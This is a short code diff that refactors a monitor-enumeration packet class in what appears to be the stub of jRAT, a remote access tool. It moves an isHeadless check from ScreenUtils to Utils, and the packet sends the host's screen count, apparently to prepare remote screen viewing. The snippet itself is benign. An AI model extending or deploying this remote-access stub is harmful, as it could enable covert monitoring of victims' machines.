@@ -6,14 +6,14 @@ import java.awt.Rectangle;
 import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
-import se.jrat.stub.utils.ScreenUtils;
+import se.jrat.common.utils.Utils;
 
 
 public class Packet18InitMonitors extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		if (!ScreenUtils.isHeadless()) {		
+		if (!Utils.isHeadless()) {		
 			GraphicsDevice[] monitors = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
 			
 			dos.writeInt(monitors.length);
